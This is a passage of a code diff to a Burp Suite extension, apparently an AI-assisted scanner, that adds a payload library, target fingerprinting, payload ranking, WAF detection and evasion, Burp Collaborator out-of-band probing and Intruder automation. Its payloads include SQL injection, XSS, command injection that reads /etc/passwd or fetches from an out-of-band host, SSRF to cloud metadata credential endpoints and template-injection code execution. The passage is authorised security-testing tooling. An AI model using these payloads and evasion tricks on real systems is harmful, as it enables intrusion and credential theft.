+                "' OR EXISTS(SELECT 1 FROM pg_sleep(2))--",
+            ],
+            "sqli_mssql": [
+                "';WAITFOR DELAY '0:0:2'--",
+                "' OR 1=1;WAITFOR DELAY '0:0:2'--",
+                "' UNION SELECT @@version,NULL--",
+            ],
+            "sqli_oracle": [
+                "' AND 1=(SELECT 1 FROM dual)--",
+                "' UNION SELECT banner,NULL FROM v$version--",
+                "'||UTL_INADDR.GET_HOST_ADDRESS('{{OOB_DOMAIN}}')||'",
+            ],
+            "sqli_sqlite": [
+                "' AND 1=(SELECT 1 FROM sqlite_master LIMIT 1)--",
+                "' UNION SELECT sqlite_version(),NULL--",
+            ],
+            "sqli_json": [
+                "\" OR 1=1--",
+                "\" AND SLEEP(2)--",
+                "\\\" OR \\\"1\\\"=\\\"1",
+            ],
+            "xss": [
+                "<script>confirm(1)</script>",
+                "\"><img src=x onerror=confirm(1)>",
+                "<svg/onload=confirm(1)>",
+                "';confirm(1);//",
+                "\"><body onload=confirm(1)>",
+                "</script><script>confirm(1)</script>",
+                "<img src=1 onerror=confirm(document.domain)>",
+                "'\"><svg><script>confirm(1)</script>",
+            ],
+            "xss_json": [
+                "\\u003cscript\\u003econfirm(1)\\u003c/script\\u003e",
+                "\\x3csvg/onload=confirm(1)\\x3e",
+                "\"</script><script>confirm(1)</script>",
+            ],
+            "xss_attr": [
+                "\" autofocus onfocus=confirm(1) x=\"",
+                "' onmouseover='confirm(1)' x='",
+            ],
+            "command_injection": [
+                "; id",
+                "| whoami",
+                "&& id",
+                "`id`",
+                "$(id)",
+                "; uname -a",
+                "&& echo scv_cmd",
+                "|| ping -c 1 {{OOB_DOMAIN}}",
+                "| nslookup {{OOB_DOMAIN}}",
+            ],
+            "command_injection_unix": [
+                ";cat /etc/passwd",
+                ";sleep 2",
+                "${IFS}id",
+                "$(nslookup {{OOB_DOMAIN}})",
+            ],
+            "command_injection_windows": [
+                "& whoami",
+                "& ver",
+                "& type C:\\Windows\\win.ini",
+                "& ping -n 1 {{OOB_DOMAIN}}",
+                "| powershell -c \"nslookup {{OOB_DOMAIN}}\"",
+            ],
+            "command_injection_oob": [
+                "&& curl http://{{OOB_DOMAIN}}/{{NONCE}}",
+                "&& wget http://{{OOB_DOMAIN}}/{{NONCE}} -O /tmp/scv",
+                "& certutil -urlcache -split -f http://{{OOB_DOMAIN}}/{{NONCE}} x",
+            ],
+            "path_traversal": [
+                "../../../../etc/passwd",
+                "..%2f..%2f..%2f..%2fetc%2fpasswd",
+                "..\\..\\..\\..\\windows\\win.ini",
+                "..%252f..%252f..%252f..%252fetc%252fpasswd",
+                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+                "....//....//....//etc/passwd",
+            ],
+            "path_traversal_unix": [
+                "../../../../proc/self/environ",
+                "../../../../var/log/auth.log",
+            ],
+            "path_traversal_windows": [
+                "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
+                "..%5c..%5c..%5c..%5cWindows%5cwin.ini",
+            ],
+            "path_traversal_api": [
+                "..%2F..%2F..%2F..%2Fetc%2Fpasswd%00",
+                "..%2f..%2f..%2f..%2fwindows%2fwin.ini%00",
+            ],
+            "ssrf": [
+                "http://127.0.0.1:80/",
+                "http://169.254.169.254/latest/meta-data/",
+                "http://169.254.169.254/metadata/instance",
+                "http://metadata.google.internal/computeMetadata/v1/",
+                "http://100.100.100.200/latest/meta-data/",
+                "http://[::1]/",
+                "http://{{OOB_DOMAIN}}/ssrf",
+                "https://{{OOB_DOMAIN}}/{{NONCE}}",
+            ],
+            "ssrf_cloud": [
+                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+                "http://169.254.169.254/metadata/identity/oauth2/token",
+            ],
+            "ssrf_oob": [
+                "http://{{OOB_DOMAIN}}/{{NONCE}}",
+                "https://{{OOB_DOMAIN}}/{{NONCE}}",
+                "dns://{{OOB_DOMAIN}}",
+            ],
+            "ssrf_gopher": [
+                "gopher://127.0.0.1:6379/_PING",
+                "gopher://127.0.0.1:11211/_stats",
+            ],
+            "ssti": [
+                "{{7*7}}",
+                "${7*7}",
+                "<%= 7*7 %>",
+                "#{7*7}",
+                "{{7*'7'}}",
+                "${{7*7}}",
+            ],
+            "ssti_jinja2": [
+                "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
+                "{{ config.items() }}",
+            ],
+            "ssti_twig": [
+                "{{7*7}}",
+                "{{_self}}",
+            ],
+            "ssti_freemarker": [
+                "${7*7}",
+                "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+            ],
+            "ssti_velocity": [
+                "#set($x=7*7)$x",
+                "#set($str=$class.inspect(\"java.lang.String\").type)",
+            ],
+            "ssti_erb": [
+                "<%= 7*7 %>",
+                "<%= ENV.to_h %>",
+            ],
+            "generic": [
+                "scv-probe-{{NONCE}}",
+                "'\"`<scv-{{NONCE}}>",
+                "../../../../../",
+                "{{7*7}}",
+                "\";print('{{NONCE}}');//",
+                "%3Cscv%3E{{NONCE}}%3C/scv%3E",
+            ],
+        }
+
+    def _get_library_payloads_for_family(self, vuln_family, target_profile=None):
+        library = self.advanced_payload_library or {}
+        generic = list(library.get("generic", []))
+        specific = list(library.get(vuln_family, []))
+        context_specific = []
+
+        if not target_profile:
+            target_profile = {}
+
+        dbms = str(target_profile.get("dbms", "")).strip().lower()
+        stack = str(target_profile.get("stack", "")).strip().lower()
+        os_hint = str(target_profile.get("os", "")).strip().lower()
+
+        if vuln_family == "sqli" and dbms:
+            context_specific.extend(list(library.get("sqli_" + dbms, [])))
+
+        if vuln_family == "xss" and target_profile.get("is_json"):
+            context_specific.extend(list(library.get("xss_json", [])))
+        if vuln_family == "xss" and target_profile.get("is_attr_context"):
+            context_specific.extend(list(library.get("xss_attr", [])))
+
+        if vuln_family == "command_injection":
+            context_specific.extend(list(library.get("command_injection_oob", [])))
+            if os_hint == "windows":
+                context_specific.extend(
+                    list(library.get("command_injection_windows", []))
+                )
+            else:
+                context_specific.extend(list(library.get("command_injection_unix", [])))
+
+        if vuln_family == "path_traversal":
+            if os_hint == "windows":
+                context_specific.extend(list(library.get("path_traversal_windows", [])))
+            else:
+                context_specific.extend(list(library.get("path_traversal_unix", [])))
+            if target_profile.get("is_api"):
+                context_specific.extend(list(library.get("path_traversal_api", [])))
+
+        if vuln_family == "ssrf":
+            context_specific.extend(list(library.get("ssrf_oob", [])))
+            if target_profile.get("cloud_hint"):
+                context_specific.extend(list(library.get("ssrf_cloud", [])))
+            if target_profile.get("is_internal_service_target"):
+                context_specific.extend(list(library.get("ssrf_gopher", [])))
+
+        if vuln_family == "ssti" and stack:
+            stack_key_map = {
+                "jinja2": "ssti_jinja2",
+                "twig": "ssti_twig",
+                "freemarker": "ssti_freemarker",
+                "velocity": "ssti_velocity",
+                "erb": "ssti_erb",
+            }
+            stack_key = stack_key_map.get(stack)
+            if stack_key:
+                context_specific.extend(list(library.get(stack_key, [])))
+
+        if vuln_family == "generic":
+            return generic
+        return context_specific + specific + generic
+
+    def _replace_payload_placeholders(self, payload, verification_nonce="", oob_domain=""):
+        value = str(payload or "")
+        if verification_nonce:
+            value = value.replace("{{NONCE}}", verification_nonce)
+        else:
+            value = value.replace("{{NONCE}}", "scv")
+        replacement_domain = str(oob_domain or "oob.invalid")
+        value = value.replace("{{OOB_DOMAIN}}", replacement_domain)
+        return value
+
+    def _normalize_payload_candidates(self, payloads, limit=12):
+        normalized = []
+        seen = set()
+        for payload in payloads:
+            value = str(payload or "").strip()
+            if not value:
+                continue
+            if value in seen:
+                continue
+            seen.add(value)
+            normalized.append(value)
+            if len(normalized) >= int(limit):
+                break
+        return normalized
+
+    def _build_target_profile(
+        self, request_text, response_text="", vuln_family="generic", injection_point=""
+    ):
+        request_value = str(request_text or "")
+        response_value = str(response_text or "")
+        combined = (request_value + "\n" + response_value).lower()
+        request_lower = request_value.lower()
+        response_lower = response_value.lower()
+
+        request_line = request_value.split("\r\n", 1)[0] if request_value else ""
+        method = ""
+        target = ""
+        if request_line:
+            parts = request_line.split(" ")
+            if len(parts) >= 2:
+                method = parts[0].upper()
+                target = parts[1]
+
+        injection_name = str(injection_point or "").lower()
+
+        dbms_patterns = {
+            "mysql": [
+                "mysql",
+                "mariadb",
+                "sql syntax",
+                "sqlstate[42000]",
+                "you have an error in your sql syntax",
+            ],
+            "postgresql": [
+                "postgresql",
+                "pg_sleep",
+                "pg_query",
+                "psqlexception",
+                "org.postgresql",
+            ],
+            "mssql": [
+                "sql server",
+                "microsoft ole db provider for sql server",
+                "odbc sql server driver",
+                "unclosed quotation mark",
+                "waitfor delay",
+            ],
+            "oracle": [
+                "ora-",
+                "oracle",
+                "from dual",
+                "utl_http",
+                "utl_inaddr",
+            ],
+            "sqlite": [
+                "sqlite",
+                "sqlite_exception",
+                "sqlite3::sqlexception",
+                "sqlite_master",
+            ],
+        }
+
+        dbms = ""
+        dbms_score = 0
+        for db, markers in dbms_patterns.items():
+            hits = 0
+            for marker in markers:
+                if marker in combined:
+                    hits += 1
+            if hits > dbms_score:
+                dbms_score = hits
+                dbms = db
+
+        stack_patterns = {
+            "jinja2": ["jinja2", "werkzeug", "flask", "{{ config"],
+            "twig": ["twig", "symfony", "php warning"],
+            "freemarker": ["freemarker", "spring", "java.lang"],
+            "velocity": ["velocity", "org.apache.velocity"],
+            "erb": ["rails", "ruby", "actionview", "<%="],
+        }
+
+        stack = ""
+        stack_score = 0
+        for stack_name, markers in stack_patterns.items():
+            hits = 0
+            for marker in markers:
+                if marker in combined:
+                    hits += 1
+            if hits > stack_score:
+                stack_score = hits
+                stack = stack_name
+
+        if (
+            vuln_family == "ssti"
+            and not stack
+            and ("spring" in combined or "jsessionid" in combined)
+        ):
+            stack = "freemarker"
+
+        os_hint = "unix"
+        if (
+            "windows" in combined
+            or "microsoft-iis" in combined
+            or "\\windows\\" in combined
+            or "win.ini" in combined
+        ):
+            os_hint = "windows"
+
+        cloud_hint = (
+            "amazonaws" in combined
+            or "x-amz" in combined
+            or "metadata.google.internal" in combined
+            or "azure" in combined
+            or "aliyun" in combined
+        )
+
+        is_json = (
+            "content-type: application/json" in request_lower
+            or "application/json" in response_lower
+            or target.endswith(".json")
+        )
+        is_xml = (
+            "application/xml" in request_lower
+            or "text/xml" in request_lower
+            or "<?xml" in request_lower
+        )
+        is_graphql = "/graphql" in target.lower() or "graphql" in request_lower
+        is_api = "/api/" in target.lower() or is_json or is_graphql
+        is_internal_service_target = (
+            "127.0.0.1" in combined
+            or "localhost" in combined
+            or "169.254.169.254" in combined
+            or "internal" in combined
+        )
+
+        is_attr_context = (
+            "=\"" in request_value
+            or "='" in request_value
+            or " on" in request_lower
+            or "href=" in request_lower
+        )
+
+        return {
+            "method": method,
+            "target": target,
+            "dbms": dbms,
+            "stack": stack,
+            "os": os_hint,
+            "cloud_hint": bool(cloud_hint),
+            "is_json": bool(is_json),
+            "is_xml": bool(is_xml),
+            "is_graphql": bool(is_graphql),
+            "is_api": bool(is_api),
+            "is_attr_context": bool(is_attr_context),
+            "is_internal_service_target": bool(is_internal_service_target),
+            "injection_name": injection_name,
+        }
+
+    def _score_payload_candidate(
+        self, payload, vuln_family, target_profile=None, waf_profile=None, ai_seed=""
+    ):
+        target_profile = target_profile or {}
+        waf_profile = waf_profile or {}
+
+        value = str(payload or "")
+        lowered = value.lower()
+        score = 10
+
+        if ai_seed and value == ai_seed:
+            score += 120
+
+        if vuln_family == "sqli":
+            dbms = str(target_profile.get("dbms", ""))
+            if dbms == "mysql" and ("sleep(" in lowered or "benchmark(" in lowered):
+                score += 30
+            if dbms == "postgresql" and "pg_sleep" in lowered:
+                score += 30
+            if dbms == "mssql" and "waitfor" in lowered:
+                score += 30
+            if dbms == "oracle" and ("from dual" in lowered or "utl_" in lowered):
+                score += 30
+            if dbms == "sqlite" and "sqlite_" in lowered:
+                score += 28
+            if "union select" in lowered:
+                score += 18
+            if target_profile.get("is_json") and "\"" in value:
+                score += 12
+            if any(
+                k in str(target_profile.get("injection_name", ""))
+                for k in ["id", "sort", "order", "limit", "page", "filter"]
+            ):
+                score += 15
+
+        if vuln_family == "xss":
+            if "<script" in lowered or "onerror" in lowered or "onload" in lowered:
+                score += 18
+            if target_profile.get("is_json") and (
+                "\\u003c" in lowered or "\\x3c" in lowered or "\\\"" in lowered
+            ):
+                score += 20
+            if target_profile.get("is_attr_context") and (
+                "autofocus" in lowered or "onfocus" in lowered
+            ):
+                score += 16
+
+        if vuln_family == "command_injection":
+            os_hint = str(target_profile.get("os", "unix"))
+            if os_hint == "windows" and (
+                "ping -n" in lowered
+                or "powershell" in lowered
+                or "certutil" in lowered
+                or "& " in lowered
+            ):
+                score += 24
+            if os_hint != "windows" and (
+                "; " in lowered
+                or "&& " in lowered
+                or "`" in lowered
+                or "$(" in lowered
+            ):
+                score += 24
+            if "{{oob_domain}}" in lowered or "oob.invalid" in lowered:
+                score -= 5
+            if any(
+                k in str(target_profile.get("injection_name", ""))
+                for k in ["cmd", "exec", "run", "shell"]
+            ):
+                score += 16
+
+        if vuln_family == "path_traversal":
+            if target_profile.get("os") == "windows" and (
+                "win.ini" in lowered or "\\windows\\" in lowered or "%5c" in lowered
+            ):
+                score += 22
+            if target_profile.get("os") != "windows" and (
+                "/etc/passwd" in lowered or "/proc/self" in lowered
+            ):
+                score += 22
+            if "%25" in lowered or "%c0%af" in lowered:
+                score += 14
+
+        if vuln_family == "ssrf":
+            if "169.254.169.254" in lowered or "metadata.google.internal" in lowered:
+                score += 20
+            if (
+                "{{oob_domain}}" in lowered
+                or "oob.invalid" in lowered
+                or "http://" in lowered
+                or "https://" in lowered
+            ):
+                score += 15
+            if any(
+                k in str(target_profile.get("injection_name", ""))
+                for k in ["url", "uri", "callback", "redirect", "next", "dest", "return"]
+            ):
+                score += 18
+            if target_profile.get("cloud_hint") and "metadata" in lowered:
+                score += 16
+
+        if vuln_family == "ssti":
+            stack = str(target_profile.get("stack", ""))
+            if stack == "jinja2" and "{{" in lowered:
+                score += 20
+            if stack == "freemarker" and "${" in lowered:
+                score += 20
+            if stack == "velocity" and "#set(" in lowered:
+                score += 20
+            if stack == "erb" and "<%=" in lowered:
+                score += 20
+            if stack == "twig" and "{{" in lowered:
+                score += 20
+
+        if waf_profile.get("detected"):
+            if (
+                "%" in value
+                or "/**/" in value
+                or "&lt;" in value
+                or "${IFS}" in value
+                or "\\u003c" in lowered
+            ):
+                score += 18
+            if len(value) > 160:
+                score -= 8
+
+        if target_profile.get("method") == "GET" and len(value) > 140:
+            score -= 10
+
+        if "\n" in value or "\r" in value:
+            score -= 8
+
+        return score
+
+    def _rank_payload_candidates(
+        self, candidates, vuln_family, target_profile=None, waf_profile=None, ai_seed=""
+    ):
+        ranked = []
+        idx = 0
+        for payload in candidates:
+            score = self._score_payload_candidate(
+                payload,
+                vuln_family,
+                target_profile=target_profile,
+                waf_profile=waf_profile,
+                ai_seed=ai_seed,
+            )
+            ranked.append((score, -idx, payload))
+            idx += 1
+
+        ranked.sort(reverse=True)
+        return [item[2] for item in ranked]
+
+    def _generate_payload_candidates(
+        self,
+        vuln_family,
+        ai_payload,
+        verification_nonce="",
+        waf_profile=None,
+        oob_domain="",
+        target_profile=None,
+    ):
+        candidates = [ai_payload]
+
+        if (
+            self.ENABLE_WAF_EVASION
+            and waf_profile
+            and waf_profile.get("detected")
+        ):
+            candidates.extend(
+                self._build_waf_evasion_payloads(ai_payload, vuln_family, waf_profile)
+            )
+
+        if self.ENABLE_ADVANCED_PAYLOADS:
+            for candidate in self._get_library_payloads_for_family(
+                vuln_family, target_profile=target_profile
+            ):
+                candidate = self._replace_payload_placeholders(
+                    candidate, verification_nonce, oob_domain
+                )
+                candidates.append(candidate)
+
+        if (
+            self.ENABLE_WAF_EVASION
+            and waf_profile
+            and waf_profile.get("detected")
+        ):
+            waf_evasion_payloads = []
+            for base in candidates[1:5]:
+                waf_evasion_payloads.extend(
+                    self._build_waf_evasion_payloads(base, vuln_family, waf_profile)
+                )
+            candidates.extend(waf_evasion_payloads)
+
+        decorated = []
+        for payload in candidates:
+            decorated.append(
+                self._decoratePayloadWithNonce(payload, vuln_family, verification_nonce)
+            )
+
+        ai_seed = self._decoratePayloadWithNonce(
+            ai_payload, vuln_family, verification_nonce
+        )
+        normalized = self._normalize_payload_candidates(decorated, limit=180)
+        ranked = self._rank_payload_candidates(
+            normalized,
+            vuln_family=vuln_family,
+            target_profile=target_profile,
+            waf_profile=waf_profile,
+            ai_seed=ai_seed,
+        )
+
+        max_count = max(1, int(self.MAX_VERIFICATION_ATTEMPTS))
+        return ranked[:max_count]
+
+    def _looks_waf_blocked(self, status_code, response_text):
+        lowered = str(response_text or "").lower()
+        if int(status_code or 0) in [401, 403, 406, 429, 501, 503]:
+            if (
+                "forbidden" in lowered
+                or "blocked" in lowered
+                or "malicious" in lowered
+                or "access denied" in lowered
+                or "waf" in lowered
+            ):
+                return True
+
+        waf_markers = [
+            "request blocked",
+            "blocked by waf",
+            "mod_security",
+            "cloudflare ray id",
+            "akamai ghost",
+            "sucuri website firewall",
+            "malicious input",
+            "web application firewall",
+        ]
+        for marker in waf_markers:
+            if marker in lowered:
+                return True
+        return False
+
+    def _detect_waf_profile(self, messageInfo=None, response_text="", response_headers=None):
+        profile = {
+            "detected": False,
+            "vendor": "",
+            "confidence": 0,
+            "signals": [],
+            "status_code": 0,
+        }
+
+        header_text = ""
+        body_text = str(response_text or "")
+        host = ""
+
+        try:
+            if messageInfo:
+                req_info = self.helpers.analyzeRequest(messageInfo)
+                try:
+                    host = str(req_info.getUrl().getHost() or "")
+                except:
+                    host = ""
+
+                resp = messageInfo.getResponse()
+                if resp:
+                    resp_info = self.helpers.analyzeResponse(resp)
+                    profile["status_code"] = int(resp_info.getStatusCode() or 0)
+                    header_text = "\n".join([str(h) for h in resp_info.getHeaders()])
+                    if not body_text:
+                        try:
+                            body_text = self.helpers.bytesToString(
+                                resp[resp_info.getBodyOffset() :]
+                            )[:4000]
+                        except:
+                            body_text = ""
+        except Exception:
+            pass
+
+        if response_headers:
+            header_text = "\n".join([str(h) for h in response_headers])
+
+        header_lower = header_text.lower()
+        body_lower = body_text.lower()
+
+        signatures = {
+            "Cloudflare": ["cf-ray", "cf-cache-status", "cloudflare"],
+            "Akamai": ["akamai", "akamai-ghost", "x-akamai"],
+            "AWS WAF": ["x-amzn-requestid", "x-amz-cf-id", "awswaf"],
+            "F5 BIG-IP ASM": ["x-waf-event", "bigip", "f5"],
+            "Imperva": ["incapsula", "imperva", "x-iinfo"],
+            "Sucuri": ["x-sucuri-id", "sucuri", "cloudproxy"],
+            "ModSecurity": ["mod_security", "modsecurity", "owasp_modsecurity_crs"],
+        }
+
+        best_vendor = ""
+        best_hits = 0
+        signals = []
+        for vendor, markers in signatures.items():
+            hits = 0
+            for marker in markers:
+                if marker in header_lower or marker in body_lower:
+                    hits += 1
+                    signals.append("%s:%s" % (vendor, marker))
+            if hits > best_hits:
+                best_hits = hits
+                best_vendor = vendor
+
+        blocked = self._looks_waf_blocked(profile.get("status_code", 0), body_lower)
+        if blocked:
+            signals.append("block-page")
+
+        if best_hits > 0 or blocked:
+            profile["detected"] = True
+            profile["vendor"] = best_vendor or "Generic WAF"
+            profile["signals"] = signals[:6]
+            profile["confidence"] = min(95, 45 + (best_hits * 18) + (10 if blocked else 0))
+            if host:
+                self._record_waf_profile(host, profile)
+
+        return profile
+
+    def _record_waf_profile(self, host, profile):
+        if not host:
+            return
+
+        with self.waf_lock:
+            existing = self.waf_profiles.get(host)
+            self.waf_profiles[host] = profile
+            if (
+                profile.get("detected")
+                and (not existing or not existing.get("detected"))
+            ):
+                self.updateStats("waf_detected")
+
+    def _build_waf_evasion_payloads(self, payload, vuln_family, waf_profile=None):
+        payload = str(payload or "").strip()
+        if not payload:
+            return []
+
+        import urllib
+
+        candidates = []
+        candidates.append(urllib.quote(payload))
+        candidates.append(urllib.quote(urllib.quote(payload)))
+
+        if vuln_family == "sqli":
+            candidates.append(payload.replace(" ", "/**/"))
+            candidates.append(payload.replace("UNION", "UN/**/ION").replace("SELECT", "SEL/**/ECT"))
+            candidates.append(payload.replace(" or ", " oR ").replace(" and ", " aNd "))
+        elif vuln_family == "xss":
+            candidates.append(
+                payload.replace("<", "&lt;").replace(">", "&gt;")
+            )
+            candidates.append(payload.replace("script", "scr<script>ipt"))
+            candidates.append(payload.replace("onerror", "onload"))
+        elif vuln_family == "command_injection":
+            candidates.append(payload.replace(" ", "${IFS}"))
+            candidates.append(payload.replace(";", "%0a"))
+            candidates.append(payload.replace("&&", "|"))
+        else:
+            candidates.append(payload.replace(" ", "%09"))
+            candidates.append(payload.replace("/", "%2f"))
+
+        if waf_profile and str(waf_profile.get("vendor", "")).lower().find("cloudflare") >= 0:
+            candidates.append(payload.replace("<", "%3C").replace(">", "%3E"))
+
+        return self._normalize_payload_candidates(candidates, limit=8)
+
+    def _pick_injection_point(self, request_info, fallback_header="X-Code-AIxBurp-Verify"):
+        if not request_info:
+            return fallback_header
+        params = request_info.getParameters() or []
+        for param in params:
+            try:
+                param_type = int(param.getType())
+            except:
+                param_type = -1
+            if param_type in [0, 1, 2, 6]:
+                name = str(param.getName() or "")
+                if name:
+                    return name
+        return fallback_header
+
+    def _get_or_create_collaborator_context(self, key="default"):
+        if not self.ENABLE_OOB_TESTING:
+            return None
+        with self.collaborator_lock:
+            if key in self.collaborator_contexts:
+                return self.collaborator_contexts[key]
+            try:
+                context = self.callbacks.createBurpCollaboratorClientContext()
+                if context:
+                    self.collaborator_contexts[key] = context
+                return context
+            except Exception as e:
+                self.stderr.println("[!] Burp Collaborator unavailable: %s" % str(e))
+                return None
+
+    def _generate_oob_payload(self, collaborator_context):
+        if not collaborator_context:
+            return ""
+        try:
+            return str(collaborator_context.generatePayload(True))
+        except Exception:
+            try:
+                return str(collaborator_context.generatePayload())
+            except Exception:
+                return ""
+
+    def _interaction_properties_to_dict(self, interaction):
+        props = {}
+        try:
+            raw_props = interaction.getProperties()
+            if raw_props:
+                for entry in raw_props.entrySet():
+                    key = str(entry.getKey())
+                    val = str(entry.getValue())
+                    props[key] = val
+        except Exception:
+            pass
+        return props
+
+    def _collect_collaborator_ids(self, collaborator_context):
+        ids = set()
+        if not collaborator_context:
+            return ids
+        try:
+            interactions = collaborator_context.fetchAllCollaboratorInteractions() or []
+            for interaction in interactions:
+                props = self._interaction_properties_to_dict(interaction)
+                marker = (
+                    props.get("interaction_id")
+                    or props.get("request_id")
+                    or props.get("time_stamp")
+                    or str(len(ids))
+                )
+                ids.add(str(marker))
+        except Exception:
+            pass
+        return ids
+
+    def _run_oob_probe_for_message(
+        self,
+        messageInfo,
+        injection_point="",
+        context_label="Verification",
+        poll_seconds=None,
+    ):
+        result = {"sent": False, "detected": False, "payload": "", "evidence": ""}
+        if not messageInfo or not self.ENABLE_OOB_TESTING:
+            return result
+
+        request_info = self.helpers.analyzeRequest(messageInfo)
+        host = ""
+        try:
+            host = str(request_info.getUrl().getHost() or "default")
+        except:
+            host = "default"
+
+        collab_context = self._get_or_create_collaborator_context(host)
+        if not collab_context:
+            self.stdout.println("[OOB] Collaborator context unavailable for %s" % host)
+            return result
+
+        oob_payload = self._generate_oob_payload(collab_context)
+        if not oob_payload:
+            self.stdout.println("[OOB] Failed to generate collaborator payload")
+            return result
+
+        request_str = self.helpers.bytesToString(messageInfo.getRequest())
+        if not injection_point:
+            injection_point = self._pick_injection_point(
+                request_info, fallback_header="X-Code-AIxBurp-OOB"
+            )
+
+        modified_request = self._injectPayload(request_str, oob_payload, injection_point)
+        if not modified_request:
+            injection_point = "X-Code-AIxBurp-OOB"
+            modified_request = self._injectPayload(request_str, oob_payload, injection_point)
+
+        if not modified_request:
+            self.stdout.println(
+                "[OOB] Could not inject collaborator payload for %s"
+                % str(request_info.getUrl())
+            )
+            return result
+
+        baseline_ids = self._collect_collaborator_ids(collab_context)
+        self.callbacks.makeHttpRequest(
+            messageInfo.getHttpService(), self.helpers.stringToBytes(modified_request)
+        )
+
+        token = oob_payload.split(".")[0].lower()
+        timeout_s = int(poll_seconds or self.OOB_POLL_SECONDS or 18)
+        started = time.time()
+        found = None
+
+        while time.time() - started < timeout_s:
+            time.sleep(3)
+            try:
+                interactions = collab_context.fetchAllCollaboratorInteractions() or []
+            except Exception:
+                interactions = []
+
+            for interaction in interactions:
+                props = self._interaction_properties_to_dict(interaction)
+                marker = (
+                    props.get("interaction_id")
+                    or props.get("request_id")
+                    or props.get("time_stamp")
+                    or ""
+                )
+                marker = str(marker)
+                if marker and marker in baseline_ids:
+                    continue
+
+                blob = " ".join([str(v).lower() for v in props.values()])
+                if token and token in blob:
+                    found = props
+                    break
+            if found:
+                break
+
+        result["sent"] = True
+        result["payload"] = oob_payload
+
+        if found:
+            proto = found.get("protocol", found.get("query_type", "dns"))
+            client_ip = found.get("client_ip", "unknown")
+            evidence = "%s interaction from %s via %s" % (
+                context_label,
+                client_ip,
+                proto,
+            )
+            result["detected"] = True
+            result["evidence"] = evidence
+            self.updateStats("oob_interactions")
+            self.stdout.println("[OOB] Interaction observed: %s" % evidence)
+        else:
+            result["evidence"] = "No collaborator interaction in %ds" % timeout_s
+            self.stdout.println("[OOB] No interaction observed in %ds" % timeout_s)
+
+        return result
+
+    def _sync_intruder_payload_factory(self):
+        try:
+            if self.ENABLE_INTRUDER_AUTOMATION and not self.intruder_payload_factory_registered:
+                self.callbacks.registerIntruderPayloadGeneratorFactory(self)
+                self.intruder_payload_factory_registered = True
+                self.stdout.println("[INTRUDER] Payload generator registered")
+            elif (
+                not self.ENABLE_INTRUDER_AUTOMATION
+                and self.intruder_payload_factory_registered
+            ):
+                if hasattr(self.callbacks, "removeIntruderPayloadGeneratorFactory"):
+                    self.callbacks.removeIntruderPayloadGeneratorFactory(self)
+                self.intruder_payload_factory_registered = False
+                self.stdout.println("[INTRUDER] Payload generator unregistered")
+        except Exception as e:
+            self.stderr.println("[!] Intruder factory sync failed: %s" % str(e))
+
+    def get_intruder_payloads(self):
+        payloads = []
+        families = [
+            "sqli",
+            "xss",
+            "command_injection",
+            "path_traversal",
+            "ssrf",
+            "ssti",
+            "generic",
+        ]
+        oob_domain = ""
+        if self.ENABLE_OOB_TESTING:
+            context = self._get_or_create_collaborator_context("intruder")
+            oob_domain = self._generate_oob_payload(context)
+
+        for family in families:
+            for payload in self._get_library_payloads_for_family(family):
+                payloads.append(
+                    self._replace_payload_placeholders(payload, "intr", oob_domain)
+                )
+
+        if self.ENABLE_WAF_EVASION:
+            for base in payloads[:10]:
+                payloads.extend(self._build_waf_evasion_payloads(base, "generic"))
+
+        return self._normalize_payload_candidates(payloads, limit=240)
+
+    # IIntruderPayloadGeneratorFactory implementation
+    def getGeneratorName(self):
+        return "Code-AIxBurp - Advanced Payload Library"
+
+    def createNewInstance(self, attack):
+        return CodeAIxBurpIntruderPayloadGenerator(self)
+
     def addTask(self, task_type, url, status="Queued", messageInfo=None):
         with self.tasks_lock:
             task = {
@@ -2414,7 +3837,7 @@ class BurpExtender(
         self._ui_dirty = True
 
     def getTabCaption(self):
-        return "SILENTCHAIN"
+        return "Code-AIxBurp"
 
     def getUiComponent(self):
         return self.panel
@@ -2437,6 +3860,22 @@ class BurpExtender(
                     lambda x: self.analyzeFromContextMenu(messages)
                 )
                 menu_list.add(analyze_item)
+
+                intruder_item = JMenuItem(
+                    "Automated Fuzzing: Send to Intruder (Advanced Payloads)"
+                )
+                intruder_item.addActionListener(
+                    lambda x: self.send_to_intruder_automated(messages)
+                )
+                menu_list.add(intruder_item)
+
+                oob_item = JMenuItem("Run OOB Probe (Burp Collaborator)")
+                oob_item.addActionListener(lambda x: self.run_oob_probe_context(messages))
+                menu_list.add(oob_item)
+
+                waf_item = JMenuItem("Detect WAF From Response")
+                waf_item.addActionListener(lambda x: self.detect_waf_from_context(messages))
+                menu_list.add(waf_item)
 
         return menu_list if menu_list.size() > 0 else None
 
@@ -2534,6 +3973,153 @@ class BurpExtender(
                 t.start()
             except Exception as e:
                 self.stderr.println("[!] Context menu error: %s" % e)
+
+    def send_to_intruder_automated(self, messages):
+        if not self.ENABLE_INTRUDER_AUTOMATION:
+            self.stdout.println("[INTRUDER] Intruder automation is disabled in Settings")
+            return
+
+        t = threading.Thread(
+            target=self._send_to_intruder_automated_thread, args=(messages,)
+        )
+        t.setDaemon(True)
+        t.start()
+
+    def _send_to_intruder_automated_thread(self, messages):
+        launched = 0
+        for message in list(messages)[:10]:
+            try:
+                http_service = message.getHttpService()
+                if not http_service:
+                    continue
+                request_bytes = message.getRequest()
+                if not request_bytes:
+                    continue
+
+                request_info = self.helpers.analyzeRequest(message)
+                payload_positions = self._derive_intruder_payload_positions(
+                    request_info, request_bytes
+                )
+
+                host = http_service.getHost()
+                port = int(http_service.getPort())
+                protocol = str(http_service.getProtocol() or "").lower()
+                use_https = protocol == "https"
+
+                if payload_positions and payload_positions.size() > 0:
+                    self.callbacks.sendToIntruder(
+                        host, port, use_https, request_bytes, payload_positions
+                    )
+                else:
+                    self.callbacks.sendToIntruder(host, port, use_https, request_bytes)
+
+                launched += 1
+                self.updateStats("intruder_launches")
+                self.stdout.println(
+                    "[INTRUDER] Sent to Intruder: %s (positions=%d)"
+                    % (str(request_info.getUrl()), payload_positions.size())
+                )
+            except Exception as e:
+                self.stderr.println("[!] Intruder launch failed: %s" % str(e))
+
+        if launched == 0:
+            self.stdout.println("[INTRUDER] No eligible requests selected")
+        else:
+            self.stdout.println("[INTRUDER] Launched %d request(s)" % launched)
+
+    def _derive_intruder_payload_positions(self, request_info, request_bytes):
+        positions = ArrayList()
+        if not request_info or not request_bytes:
+            return positions
+
